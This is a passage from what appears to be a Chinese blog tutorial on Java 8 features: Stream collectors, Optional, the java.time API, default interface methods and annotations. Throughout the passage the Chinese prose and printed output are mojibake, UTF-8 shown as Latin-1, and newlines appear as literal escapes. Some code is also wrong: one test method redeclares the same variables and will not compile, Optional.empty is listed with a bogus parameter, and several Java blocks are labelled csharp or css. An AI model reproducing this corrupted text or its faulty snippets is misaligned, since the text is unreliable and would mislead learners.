ç”¨å®ƒæ¥è¿›è¡Œç½‘ç»œæœç´¢è€Œå‡ºåã€‚\n\n```java\n@Test\npublic void testReduce() {\n  List<Integer> list= Arrays.asList(1,2,3);\n  Integer sum = list.stream().reduce(4,(x,y)->x+y);\n  System.out.println(sum);\n\n  Optional<Integer> sum2 = list.stream().reduce((x, y) -> x+y);\n  System.out.println(sum2.get());\n}\n\n/**\n10\n6\n**/\n```\n\n#### æ”¶é›†\n\n| æ–¹æ³•                 | æè¿°                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| collect(Collector c) | å°†æµè½¬æ¢ä¸ºå…¶ä»–å½¢å¼ã€‚æ¥æ”¶ä¸€ä¸ªCollectoræ¥å£çš„å®ç°ï¼Œç”¨äºç»™Streamä¸­å…ƒç´ åšæ±‡æ€»çš„æ–¹æ³• |\n\nCollector æ¥å£ä¸­æ–¹æ³•çš„å®ç°å†³å®šäº†å¦‚ä½•å¯¹æµæ‰§è¡Œæ”¶é›†çš„æ“ä½œ(å¦‚æ”¶é›†åˆ°Listã€Setã€Map)ã€‚\n\nå¦å¤–ï¼ŒCollectors å®ç”¨ç±»æä¾›äº†å¾ˆå¤šé™æ€æ–¹æ³•ï¼Œå¯ä»¥æ–¹ä¾¿åœ°åˆ›å»ºå¸¸è§æ”¶é›†å™¨å®ä¾‹ï¼Œå…·ä½“æ–¹æ³•ä¸å®ä¾‹å¦‚ä¸‹è¡¨ï¼š\n\n![](https://img.jwt1399.top/img/image-20220405000215673.png)\n\n![](https://img.jwt1399.top/img/image-20220405000313618.png)\n\n```java\n@Test\npublic void testCollect1() {\n    System.out.println(\"==========toList==============\");\n    List<String> collect = emps.stream()\n      .map(Employee2::getName)\n      .collect(Collectors.toList());\n    collect.forEach(System.out::println);\n\n    System.out.println(\"==========toSet==============\");\n    Set<String> collect2 = emps.stream()\n      .map(Employee2::getName)\n      .collect(Collectors.toSet());//setä¸å…è®¸é‡å¤\n    collect2.forEach(System.out::println);\n\n    System.out.println(\"==========toCollection==============\");\n    HashSet<String> collect3 = emps.stream()\n      .map(Employee2::getName)\n      .collect(Collectors.toCollection(HashSet::new));\n    collect3.forEach(System.out::println);\n}\n\n/**\n==========toList==============\næå››\nå¼ ä¸‰\nç‹äº”\nèµµå…­\nèµµå…­\nèµµå…­\nç”°ä¸ƒ\n==========toSet==============\næå››\nå¼ ä¸‰\nç‹äº”\nèµµå…­\nç”°ä¸ƒ\n==========toCollection==============\næå››\nå¼ ä¸‰\nç‹äº”\nèµµå…­\nç”°ä¸ƒ\n**/\n```\n\n```java\n@Test\npublic void testCollect2() {\n    System.out.println(\"==========counting==============\");\n    Long collect7 = emps.stream()\n      .collect(Collectors.counting());\n    System.out.println(collect7);\n\n    System.out.println(\"==========summingDouble==============\");\n    Double collect5 = emps.stream()\n      .collect(Collectors.summingDouble(Employee2::getSalary));\n    System.out.println(collect5);\n\n    System.out.println(\"==========averagingDouble==============\");\n    Double collect6 = emps.stream()\n      .collect(Collectors.averagingDouble((e)->e.getSalary()));\n    System.out.println(collect6);\n\n    System.out.println(\"==========summarizingDouble==============\");\n    DoubleSummaryStatistics collect9 = emps.stream()\n      .collect(Collectors.summarizingDouble(Employee2::getSalary));\n    long count = collect9.getCount();\n    double average = collect9.getAverage();\n    double max = collect9.getMax();\n    double min = collect9.getMin();\n    double sum = collect9.getSum();\n    System.out.println(\"count:\"+count);\n    System.out.println(\"average:\"+average);\n    System.out.println(\"max:\"+max);\n    System.out.println(\"min:\"+min);\n    System.out.println(\"sum:\"+sum);\n}\n/**\n==========counting==============\n7\n==========summingDouble==============\n48888.840000000004\n==========averagingDouble==============\n6984.120000000001\n==========summarizingDouble==============\ncount:7\naverage:6984.120000000001\nmax:9999.99\nmin:3333.33\nsum:48888.840000000004\n**/\n```\n\n```java\n@Test\npublic void testCollect3() {\n  //ç»„æ¥å­—ç¬¦ä¸²\n  System.out.println(\"==========joining==============\");\n  String collect1 = emps.stream()\n    .map((e)->e.getName())\n    .collect(Collectors.joining());\n  System.out.println(collect1);\n\n  System.out.println(\"==========joining2==============\");\n  String collect2 = emps.stream()\n    .map(Employee2::getName)\n    .collect(Collectors.joining(\",\"));\n  System.out.println(collect2);\n\n  System.out.println(\"==========joining3==============\");\n  String collect3 = emps.stream()\n    .map(Employee2::getName)\n    .collect(Collectors.joining(\",\", \"å‰ç¼€-\", \"-åç¼€\"));\n  System.out.println(collect3);\n\n\n  System.out.println(\"==========maxBy==============\");\n  Optional<Double> collect4 = emps.stream()\n    .map(Employee2::getSalary)\n    .collect(Collectors.maxBy(Double::compare));\n  System.out.println(collect4.get());\n\n\n  System.out.println(\"==========minBy==============\");\n  Optional<Double> collect5 = emps.stream()\n    .map(Employee2::getSalary)\n    .collect(Collectors.minBy(Double::compare));\n  System.out.println(collect5);\n}\n/**\n==========joining==============\næå››å¼ ä¸‰ç‹äº”èµµå…­èµµå…­èµµå…­ç”°ä¸ƒ\n==========joining2==============\næå››,å¼ ä¸‰,ç‹äº”,èµµå…­,èµµå…­,èµµå…­,ç”°ä¸ƒ\n==========joining3==============\nå‰ç¼€-æå››,å¼ ä¸‰,ç‹äº”,èµµå…­,èµµå…­,èµµå…­,ç”°ä¸ƒ-åç¼€\n==========maxBy==============\n9999.99\n==========minBy==============\nOptional[3333.33]\n**/\n```\n\n```java\n @Test\npublic void testCollect4() {\n  System.out.println(\"==========reducing==============\");\n  Optional<Double> collect = emps.stream()\n    .map(Employee2::getSalary)\n    .collect(Collectors.reducing(Double::sum));\n  System.out.println(collect.get());\n  //åˆ†ç»„\n  System.out.println(\"==========groupingBy==============\");\n  Map<Employee2.Status, List<Employee2>> collect2 = emps.stream()\n    .collect(Collectors.groupingBy(Employee2::getStatus));\n  System.out.println(collect2);\n\n  //å¤šçº§åˆ†ç»„\n  System.out.println(\"==========groupingBy2==============\");\n  Map<Employee2.Status, Map<String, List<Employee2>>> collect3 = emps.stream()\n    .collect(Collectors.groupingBy(Employee2::getStatus, Collectors.groupingBy((e)->{\n      if(e.getAge() >= 60) {\n        return \"è€å¹´\";\n      } else if(e.getAge() >= 35) {\n        return \"ä¸­å¹´\";\n      } else {\n        return \"æˆå¹´\";\n      }\n    })));\n  System.out.println(collect3);\n  //åˆ†åŒº\n  System.out.println(\"==========partitioningBy==============\");\n  Map<Boolean, List<Employee2>> collect4 = emps.stream()\n    .collect(Collectors.partitioningBy((e)->e.getSalary()>5000));\n  System.out.println(collect4);\n}\n/**\n48888.84000000001\n==========groupingBy==============\n{BUSY=[Employee2 [id=102, name=æå››, age=59, salary=6666.66, status=BUSY], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=BUSY], Employee2 [id=105, name=ç”°ä¸ƒ, age=38, salary=5555.55, status=BUSY]], VOCATION=[Employee2 [id=103, name=ç‹äº”, age=28, salary=3333.33, status=VOCATION]], FREE=[Employee2 [id=101, name=å¼ ä¸‰, age=18, salary=9999.99, status=FREE], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=FREE], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=FREE]]}\n==========groupingBy2==============\n{BUSY={æˆå¹´=[Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=BUSY]], ä¸­å¹´=[Employee2 [id=102, name=æå››, age=59, salary=6666.66, status=BUSY], Employee2 [id=105, name=ç”°ä¸ƒ, age=38, salary=5555.55, status=BUSY]]}, VOCATION={æˆå¹´=[Employee2 [id=103, name=ç‹äº”, age=28, salary=3333.33, status=VOCATION]]}, FREE={æˆå¹´=[Employee2 [id=101, name=å¼ ä¸‰, age=18, salary=9999.99, status=FREE], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=FREE], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=FREE]]}}\n==========partitioningBy==============\n{false=[Employee2 [id=103, name=ç‹äº”, age=28, salary=3333.33, status=VOCATION]], true=[Employee2 [id=102, name=æå››, age=59, salary=6666.66, status=BUSY], Employee2 [id=101, name=å¼ ä¸‰, age=18, salary=9999.99, status=FREE], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=BUSY], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=FREE], Employee2 [id=104, name=èµµå…­, age=8, salary=7777.77, status=FREE], Employee2 [id=105, name=ç”°ä¸ƒ, age=38, salary=5555.55, status=BUSY]]}\n**/\n```\n\n## Optionalç±»\n\nOptional ç±» (java.util.Optional) æ˜¯ä¸€ä¸ªå®¹å™¨ç±»ï¼Œä»£è¡¨ä¸€ä¸ªå€¼å­˜åœ¨æˆ–ä¸å­˜åœ¨ï¼ŒåŸæ¥ç”¨ null è¡¨ç¤ºä¸€ä¸ªå€¼ä¸å­˜åœ¨ï¼Œç°åœ¨ç”¨ Optional å¯ä»¥æ›´å¥½çš„è¡¨è¾¾è¿™ä¸ªæ¦‚å¿µï¼›Optional ç±»ä¸»è¦è§£å†³çš„é—®é¢˜å°±æ˜¯ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼ˆNullPointerExceptionï¼‰\n\nå¸¸ç”¨æ–¹æ³•ï¼š\n\n- Optional.of(T t)ï¼šåˆ›å»ºä¸€ä¸ª Optional å®ä¾‹\n- Optional.empty(T t)ï¼šåˆ›å»ºä¸€ä¸ªç©ºçš„ Optional å®ä¾‹\n- Optional.ofNullable(T t)ï¼šè‹¥ t ä¸ä¸º nullï¼Œåˆ›å»º Optional å®ä¾‹ï¼Œå¦åˆ™ç©ºå®ä¾‹\n- isPresent()ï¼šåˆ¤æ–­æ˜¯å¦åŒ…å«æŸå€¼\n- orElse(T t)ï¼šå¦‚æœè°ƒç”¨å¯¹è±¡åŒ…å«å€¼ï¼Œè¿”å›è¯¥å€¼ï¼Œå¦åˆ™è¿”å› t\n- orElseGet(Supplier s)ï¼šå¦‚æœè°ƒç”¨å¯¹è±¡åŒ…å«å€¼ï¼Œè¿”å›è¯¥å€¼ï¼Œå¦åˆ™è¿”å› s è·å–çš„å€¼\n- map(Function f)ï¼šå¦‚æœæœ‰å€¼å¯¹å…¶å¤„ç†ï¼Œå¹¶è¿”å›å¤„ç†åçš„ Optionalï¼Œå¦åˆ™è¿”å› Optional.empty()\n- flatmap(Function mapper)ï¼šä¸ map ç›¸ä¼¼ï¼Œè¦æ±‚è¿”å›å€¼å¿…é¡»æ˜¯ Optional\n\n```java\n@Test\npublic void test01(){\n    Optional<Employee> op = Optional.of(new Employee());\n    Employee employee = op.get();\n  \n    Optional<Employee> op = Optional.empty();\n    Employee employee = op.get();\n  \n    Optional<Employee> op = Optional.ofNullable(new Employee());\n    Employee employee = op.get();\n  \n    Optional<Employee> op = Optional.ofNullable(new Employee());\n    if (op.isPresent()) {\n        Employee employee = op.get();\n    }\n}\n```\n\nè¯¦ç»†è¯·çœ‹ï¼š[Optionalç±» - ç®€ä¹¦ (jianshu.com)](https://www.jianshu.com/p/58b3f09a3429)\n\n## æ–°æ—¶é—´æ—¥æœŸ**API**\n\n### æœ¬åœ°æ—¶é—´/æ—¥æœŸ\n\n- LocalDateã€LocalTimeã€LocalDateTime åˆ†åˆ«è¡¨ç¤ºä½¿ç”¨  ISO-8601æ—¥å†ç³»ç»Ÿçš„æ—¥æœŸã€æ—¶é—´ã€æ—¥æœŸå’Œæ—¶é—´ã€‚\n\n- å®ƒä»¬æä¾›äº†ç®€å•çš„æ—¥æœŸæˆ–æ—¶é—´ï¼Œå¹¶ä¸åŒ…å«å½“å‰çš„æ—¶é—´ä¿¡æ¯ã€‚ä¹Ÿä¸åŒ…å«ä¸æ—¶åŒºç›¸å…³çš„ä¿¡æ¯ã€‚\n\n**å¸¸ç”¨æ–¹æ³•**\n\n![](https://img.jwt1399.top/img/image-20220405180709449.png)\n\n```java\n@Test\npublic void test01(){\n    //è·å–å½“å‰æ—¶é—´æ—¥æœŸ now\n    LocalDateTime ldt1 = LocalDateTime.now();\n    System.out.println(ldt1);\n\n    //æŒ‡å®šæ—¶é—´æ—¥æœŸ of\n    LocalDateTime ldt2 = LocalDateTime.of(2020, 05, 17, 16, 24, 33);\n    System.out.println(ldt2);\n\n    //åŠ  plus\n    LocalDateTime ldt3 = ldt2.plusYears(2);\n    System.out.println(ldt3);\n\n    //å‡ minus\n    LocalDateTime ldt4 = ldt2.minusMonths(3);\n    System.out.println(ldt4);\n\n    //è·å–æŒ‡å®šçš„å¹´æœˆæ—¥æ—¶åˆ†ç§’... get\n    System.out.println(ldt2.getDayOfYear());\n    System.out.println(ldt2.getHour());\n    System.out.println(ldt2.getSecond());\n}\n```\n\n### **Instant**æ—¶é—´æˆ³\n\nå®ƒæ˜¯ä»¥ Unix å…ƒå¹´ 1970-01-01 00:00:00 åˆ°æŸä¸ªæ—¶é—´ä¹‹é—´çš„æ¯«ç§’å€¼\n\n```java\n@Test\npublic void test02(){\n    // é»˜è®¤è·å– UTC æ—¶åŒº (UTCï¼šä¸–ç•Œåè°ƒæ—¶é—´)\n    Instant ins1 = Instant.now();\n    System.out.println(ins1);\n\n    //å¸¦åç§»é‡çš„æ—¶é—´æ—¥æœŸ (å¦‚ï¼šUTC + 8)\n    OffsetDateTime odt1 = ins1.atOffset(ZoneOffset.ofHours(8));\n    System.out.println(odt1);\n\n    //è½¬æ¢æˆå¯¹åº”çš„æ¯«ç§’å€¼\n    long milli1 = ins1.toEpochMilli();\n    System.out.println(milli1);\n\n    //æ„å»ºæ—¶é—´æˆ³\n    Instant ins2 = Instant.ofEpochSecond(60);\n    System.out.println(ins2);\n}\n```\n\n### æ—¶é—´å·®/æ—¥æœŸå·®\n\n- Duration:ç”¨äºè®¡ç®—ä¸¤ä¸ªâ€œæ—¶é—´â€é—´éš”\n\n- Period:ç”¨äºè®¡ç®—ä¸¤ä¸ªâ€œæ—¥æœŸâ€é—´éš”\n\n```java\n@Test\npublic void test03(){\n    //è®¡ç®—ä¸¤ä¸ªæ—¶é—´ä¹‹é—´çš„é—´éš” between\n    Instant ins1 = Instant.now();\n    try {\n        Thread.sleep(1000);\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    }\n    Instant ins2 = Instant.now();\n    Duration dura1 = Duration.between(ins1, ins2);\n    System.out.println(dura1.getSeconds());\n    System.out.println(dura1.toMillis());\n}\n\n@Test\npublic void test04(){\n    LocalDate ld1 = LocalDate.of(2016, 9, 1);\n    LocalDate ld2 = LocalDate.now();\n    Period period = Period.between(ld1, ld2);  // ISO æ ‡å‡†\n    System.out.println(period.getYears());\n    System.out.println(period.toTotalMonths());\n}\n```\n\n### æ—¶é—´æ ¡æ­£å™¨\n\n- TemporalAdjusterï¼šæ—¶é—´æ ¡æ­£å™¨ã€‚æœ‰æ—¶æˆ‘ä»¬å¯èƒ½éœ€è¦è·å–ä¾‹å¦‚ï¼šå°†æ—¥æœŸè°ƒæ•´åˆ°â€œä¸‹ä¸ªå‘¨æ—¥â€ç­‰æ“ä½œã€‚\n\n- TemporalAdjustersï¼šè¯¥ç±»é€šè¿‡é™æ€æ–¹æ³•æä¾›äº†å¤§é‡çš„å¸¸ç”¨TemporalAdjusterçš„å®ç°ã€‚\n\n```java\n@Test\npublic void test01(){\n    //TemporalAdjustersï¼šæ—¶é—´æ ¡æ­£å™¨\n    LocalDateTime ldt1 = LocalDateTime.now();\n    System.out.println(ldt1);\n\n    //æŒ‡å®šæ—¥æœŸæ—¶é—´ä¸­çš„ å¹´ æœˆ æ—¥ ...\n    LocalDateTime ldt2 = ldt1.withDayOfMonth(10);\n    System.out.println(ldt2);\n\n    //æŒ‡å®šæ—¶é—´æ ¡æ­£å™¨\n    LocalDateTime ldt3 = ldt1.with(TemporalAdjusters.next(DayOfWeek.SUNDAY));\n    System.out.println(ldt3);\n\n    //è‡ªå®šä¹‰æ—¶é—´æ ¡æ­£å™¨\n    LocalDateTime ldt5 = ldt1.with((ta) -> {\n        LocalDateTime ldt4 = (LocalDateTime) ta;\n        DayOfWeek dow1 = ldt4.getDayOfWeek();\n        if (dow1.equals(DayOfWeek.FRIDAY)) {\n            return ldt4.plusDays(3);\n        } else if (dow1.equals(DayOfWeek.SATURDAY)) {\n            return ldt4.plusDays(2);\n        } else {\n            return ldt4.plusDays(1);\n        }\n    });\n    System.out.println(ldt5);\n}\n```\n\n### è§£æä¸æ ¼å¼åŒ–\n\n- DateTimeFormatterï¼šæ ¼å¼åŒ–æ—¶é—´ / æ—¥æœŸ\n\n```java\n@Test\npublic void test01(){\n    //é»˜è®¤æ ¼å¼åŒ–\n    DateTimeFormatter dtf1 = DateTimeFormatter.ISO_DATE_TIME;\n    LocalDateTime ldt1 = LocalDateTime.now();\n    String str1 = ldt1.format(dtf1);\n    System.out.println(str1);\n\n    //è‡ªå®šä¹‰æ ¼å¼åŒ– ofPattern\n    DateTimeFormatter dtf2 = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n    LocalDateTime ldt2 = LocalDateTime.now();\n    String str2 = ldt2.format(dtf2);\n    System.out.println(str2);\n\n    //è§£æ\n    LocalDateTime newDate = ldt1.parse(str1, dtf1);\n    System.out.println(newDate);\n}\n\n```\n\n### æ—¶åŒº\n\n- ZonedDate ã€ZonedTimeã€ZonedDateTime åˆ†åˆ«ä¸ºå¸¦æ—¶åŒºçš„æ—¥æœŸã€æ—¶é—´ã€æ—¥æœŸå’Œæ—¶é—´ã€‚\n\n```java\n@Test\npublic void test02(){\n    //æŸ¥çœ‹æ”¯æŒçš„æ—¶åŒº\n    Set<String> set = ZoneId.getAvailableZoneIds();\n    set.forEach(System.out::println);\n\n    //æŒ‡å®šæ—¶åŒº\n    LocalDateTime ldt1 = LocalDateTime.now(ZoneId.of(\"Europe/Tallinn\"));\n    System.out.println(ldt1);\n  \n    // ä¸Šæµ·æ—¶é—´\n    ZoneId shanghaiZoneId = ZoneId.of(\"Asia/Shanghai\");\n    ZonedDateTime shanghaiZonedDateTime = ZonedDateTime.now(shanghaiZoneId);\n\n    //åœ¨å·²æ„å»ºå¥½çš„æ—¥æœŸæ—¶é—´ä¸ŠæŒ‡å®šæ—¶åŒº\n    LocalDateTime ldt2 = LocalDateTime.now(ZoneId.of(\"Europe/Tallinn\"));\n    ZonedDateTime zdt1 = ldt2.atZone(ZoneId.of(\"Europe/Tallinn\"));\n    System.out.println(zdt1);\n}\n```\n\n\n\n## æ¥å£é»˜è®¤æ–¹æ³•ä¸é™æ€æ–¹æ³•\n\n### é»˜è®¤æ–¹æ³•\n\n- åœ¨ Java8 ä»¥å‰ï¼Œæ¥å£ä¸­åªèƒ½æœ‰æŠ½è±¡æ–¹æ³•(public abstract ä¿®é¥°çš„æ–¹æ³•)è·Ÿå…¨å±€é™æ€å¸¸é‡(public static final å¸¸é‡  )\n- åœ¨ Java8 ä¸­ï¼Œå…è®¸æ¥å£ä¸­åŒ…å«å…·æœ‰å…·ä½“å®ç°çš„æ–¹æ³•ï¼Œç§°ä¸º â€œé»˜è®¤æ–¹æ³•â€ï¼Œé»˜è®¤æ–¹æ³•ä½¿ç”¨ default å…³é”®å­—ä¿®é¥°\n\n```java\npublic interface MyFun {\n    T func(int a);\n\n    default Integer getAge(){\n        return 22;\n    }\n}\n```\n\n**é»˜è®¤æ–¹æ³•çš„\"ç±»ä¼˜å…ˆ\"åŸåˆ™**\n\nè‹¥ä¸€ä¸ªæ¥å£ä¸­å®šä¹‰äº†ä¸€ä¸ªé»˜è®¤æ–¹æ³•ï¼Œè€Œå¦å¤–ä¸€ä¸ªçˆ¶ç±»æˆ–æ¥å£ä¸­åˆå®šä¹‰äº†ä¸€ä¸ªåŒåçš„æ–¹æ³•æ—¶\n\nï¼ˆ1ï¼‰é€‰æ‹©çˆ¶ç±»ä¸­çš„æ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªçˆ¶ç±»æä¾›äº†å…·ä½“çš„å®ç°ï¼Œé‚£ä¹ˆæ¥å£ä¸­å…·æœ‰ç›¸åŒåç§°å’Œå‚æ•°çš„é»˜è®¤æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚\n\n1ã€æ–°å»ºä¸€ä¸ªæ¥å£ MyInterface1.javaï¼Œé‡Œé¢æœ‰ä¸ªé»˜è®¤å®ç°æ–¹æ³• method1\n\n```java\npublic interface MyInterface1 {\n    default void method1() {\n        System.out.println(\"MyInterface1ä¸­çš„é»˜è®¤æ–¹æ³•\");\n    }\n}\n```\n\n2ã€å†å»ºä¸€ä¸ªç±» FatherClass.javaï¼Œé‡Œé¢åŒæ ·æœ‰ä¸€ä¸ªåŒåçš„å®ç°æ–¹æ³• method1\n\n```java\npublic class FatherClass {\n    public void method1() {\n        System.out.println(\"FatherClassä¸­çš„æ–¹æ³•method1\");\n    }  \n}\n```\n\n3ã€åˆ›å»ºä¸€ä¸ªå­ç±» SonClass.javaï¼Œè¿™ä¸ªç±»ç»§æ‰¿ FatherClass çˆ¶ç±»ï¼Œå¹¶ä¸”å®ç° MyInterface1 æ¥å£ã€‚\n\n```java\npublic class SonClass extends FatherClass implements MyInterface1{\n\n}\n```\n\n4ã€æµ‹è¯•è¿™ä¸ªå­ç±»åˆ›å»ºåï¼Œè°ƒç”¨ method1 æ–¹æ³•ï¼Œä¼šè°ƒç”¨å“ªä¸ªç±»æˆ–è€…æ¥å£ä¸­çš„å®ç°æ–¹æ³•ï¼Ÿ\n\n```java\n@Test\npublic void test01() {\n  SonClass sc = new SonClass();\n  sc.method1();\n}\n/**\nFatherClassä¸­çš„æ–¹æ³•method1\n**/\n```\n\n5ã€ç»“æœï¼šè°ƒç”¨çˆ¶ç±»ä¸­çš„æ–¹æ³•ï¼Œå¹¶ä¸æ˜¯æ¥å£ä¸­çš„å®ç°æ–¹æ³•ã€‚\n\nï¼ˆ2ï¼‰æ¥å£å†²çªã€‚å¦‚æœä¸€ä¸ªæ¥å£æä¾›ä¸€ä¸ªé»˜è®¤æ–¹æ³•ï¼Œè€Œå¦ä¸€ä¸ªæ¥å£ä¹Ÿæä¾›äº†ä¸€ä¸ªå…·æœ‰ç›¸åŒåç§°å’Œå‚æ•°åˆ—è¡¨çš„æ–¹æ³•ï¼ˆä¸ç®¡æ–¹æ³•æ˜¯å¦æ˜¯é»˜è®¤æ–¹æ³•ï¼‰ï¼Œé‚£ä¹ˆå¿…é¡»è¦†ç›–è¯¥æ–¹æ³•æ¥è§£å†³å†²çªï¼Œå­ç±»å¿…é¡»æŒ‡å®šè¦†ç›–å“ªä¸ªçˆ¶æ¥å£ä¸­çš„æ–¹æ³•ã€‚\n\n1ã€æ–°å»ºä¸€ä¸ª MyInterface2 æ¥å£ï¼ŒåŒ MyInterface1 æ¥å£ä¸­æ–¹æ³•åŒåã€‚\n\n```csharp\npublic interface MyInterface2 {\n    default void method1() {\n        System.out.println(\"MyInterface2ä¸­çš„é»˜è®¤æ–¹æ³•\");\n    }\n}\n```\n\n2ã€æ–°å»º SonClass2 ç±»ï¼Œå®ç°äº† MyInterface1ï¼ŒMyInterface2 ä¸¤ä¸ªæ¥å£ï¼Œè¿™æ—¶ä¼šæé†’ä½ è¦å®ç°å“ªä¸ªæ¥å£ä¸­çš„é»˜è®¤æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n\n```java\npublic class SonClass2 implements MyInterface1,MyInterface2{\n    @Override\n    public void method1() {\n        MyInterface1.super.method1();//è¦†ç›–MyInterface1\n    }\n\n}\n```\n\n3ã€æµ‹è¯•\n\n```java\n@Test\n    public void test02() {\n        SonClass2 sc = new SonClass2();\n        sc.method1();\n    }\n```\n\n4ã€ç»“æœï¼šè°ƒç”¨ MyInterface1 ä¸­çš„é»˜è®¤æ–¹æ³•\n\n### é™æ€æ–¹æ³•\n\nJava8 ä¸­ï¼Œæ¥å£ä¸­è¿˜å…è®¸æ·»åŠ é™æ€æ–¹æ³•\n\n```csharp\npublic interface MyInterface1 {\n  \n    default void method1() {\n        System.out.println(\"MyInterface1ä¸­çš„é»˜è®¤æ–¹æ³•\");\n    }\n    \n    public static void say() {\n        System.out.println(\"è¿™æ˜¯MyInterface1ä¸­çš„é™æ€æ–¹æ³•\");\n    }\n}\n```\n\nè°ƒç”¨æ–¹å¼ï¼š**æ¥å£å.æ–¹æ³•å();**\n\n```css\nMyInterface1.say();\n```\n\n## æ³¨è§£\n\nJava8 å¯¹æ³¨è§£å¤„ç†æä¾›äº†ä¸¤ç‚¹æ”¹è¿›ï¼šå¯é‡å¤çš„æ³¨è§£åŠå¯ç”¨äºç±»å‹çš„æ³¨è§£ã€‚\n\n### é‡å¤æ³¨è§£\n\nJava8 ä»¥å‰çš„ç‰ˆæœ¬ä½¿ç”¨æ³¨è§£æœ‰ä¸€ä¸ªé™åˆ¶æ˜¯ç›¸åŒçš„æ³¨è§£åœ¨åŒä¸€ä½ç½®åªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼Œä¸èƒ½ä½¿ç”¨å¤šæ¬¡ã€‚\n\nJava 8 å¼•å…¥äº†é‡å¤æ³¨è§£æœºåˆ¶ï¼Œè¿™æ ·ç›¸åŒçš„æ³¨è§£å¯ä»¥åœ¨åŒä¸€åœ°æ–¹ä½¿ç”¨å¤šæ¬¡ã€‚é‡å¤æ³¨è§£æœºåˆ¶æœ¬èº«å¿…é¡»ç”¨ @Repeatable æ³¨è§£ã€‚\n\n```java\npublic class Test01 {\n    //é‡å¤æ³¨è§£\n    @Test\n    @MyAnnotation(\"Hello\")\n    @MyAnnotation(\"World\")\n    public void test01() throws NoSuchMethodException {\n        Class<Test01> clazz = Test01.class;\n        Method test01 = clazz.getMethod(\"test01\");\n        MyAnnotation[] mas = test01.getAnnotationsByType(MyAnnotation.class);\n        for (MyAnnotation ma : mas) {\n            System.out.println(ma.value());\n        }\n    }\n}\n```\n\n### ç±»å‹æ³¨è§£\n\n- 1ã€Java 8 çš„ç±»å‹æ³¨è§£æ‰©å±•äº†æ³¨è§£ä½¿ç”¨çš„èŒƒå›´ã€‚åœ¨ Java 8ä¹‹å‰ï¼Œæ³¨è§£åªèƒ½æ˜¯åœ¨å£°æ˜çš„åœ°æ–¹æ‰€ä½¿ç”¨ï¼ŒJava8 å¼€å§‹ï¼Œæ³¨è§£å¯ä»¥åº”ç”¨åœ¨ä»»ä½•åœ°æ–¹ã€‚\n\n  - 1.åˆ›å»ºç±»å®ä¾‹\n\n  - ```java\n    new @Interned MyObject();\n    ```\n\n  - 2.ç±»å‹æ˜ å°„\n\n  - ```java\n    myString = (@NonNull String) str;\n    ```\n\n  - 3.implements è¯­å¥ä¸­\n\n  - ```java\n    class UnmodifiableList<T> implements@Readonly List<@Readonly T> { ... }\n    ```\n\n  - 4.throw exceptionå£°æ˜\n\n  - ```java\n    void monitorTemperature() throws@Critical TemperatureException { ... }\n    ```\n\n- 2ã€æ–°å¢ ElementType.TYPE_USE å’Œ ElementType.TYPE_PARAMETERï¼ˆåœ¨Targetä¸Šï¼‰\n\n  - ElementType.TYPE_PARAMETER è¡¨ç¤ºè¯¥æ³¨è§£èƒ½å†™åœ¨ç±»å‹å˜é‡çš„å£°æ˜è¯­å¥ä¸­ã€‚\n\n  - ElementType.TYPE_USE è¡¨ç¤ºè¯¥æ³¨è§£èƒ½å†™åœ¨ä½¿ç”¨ç±»å‹çš„ä»»ä½•è¯­å¥ä¸­ï¼ˆä¾‹å¦‚ï¼šå£°æ˜è¯­å¥ã€æ³›å‹å’Œå¼ºåˆ¶è½¬æ¢è¯­å¥ä¸­çš„ç±»å‹ï¼‰ã€‚\n\nä¾‹å¦‚ï¼Œä¸‹é¢çš„ç¤ºä¾‹ã€‚\n\n```\n@Target({ElementType.TYPE_PARAMETER, ElementType.TYPE_USE})\n@interface MyAnnotation {}\n```\n\n- 3ã€ç±»å‹æ³¨è§£çš„ä½œç”¨ï¼šç±»å‹æ³¨è§£è¢«ç”¨æ¥æ”¯æŒåœ¨Javaçš„ç¨‹åºä¸­åšå¼ºç±»å‹æ£€æŸ¥ã€‚é…åˆç¬¬ä¸‰æ–¹æ’ä»¶å·¥å…·Checker Frameworkï¼ˆæ³¨ï¼šæ­¤æ’ä»¶so easy,è¿™é‡Œä¸ä»‹ç»äº†ï¼‰ï¼Œå¯ä»¥åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æµ‹å‡ºruntime errorï¼ˆä¾‹å¦‚ï¼šUnsupportedOperationExceptionï¼›NumberFormatExceptionï¼›NullPointerExceptionå¼‚å¸¸ç­‰éƒ½æ˜¯runtime errorï¼‰ï¼Œä»¥æé«˜ä»£ç è´¨é‡ã€‚è¿™å°±æ˜¯ç±»å‹æ³¨è§£çš„ä½œç”¨ã€‚\n\n## å‚è€ƒ\n\n- [Stream API - ç®€ä¹¦ (jianshu.com)](https://www.jianshu.com/p/8e3b8a483bd8)\n- [ Java 8 å­¦ä¹ ç¬”è®°](https://blog.csdn.net/weixin_45225595/article/details/106203264)\n- [Optionalç±» - ç®€ä¹¦ (jianshu.com)](https://www.jianshu.com/p/58b3f09a3429)\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td 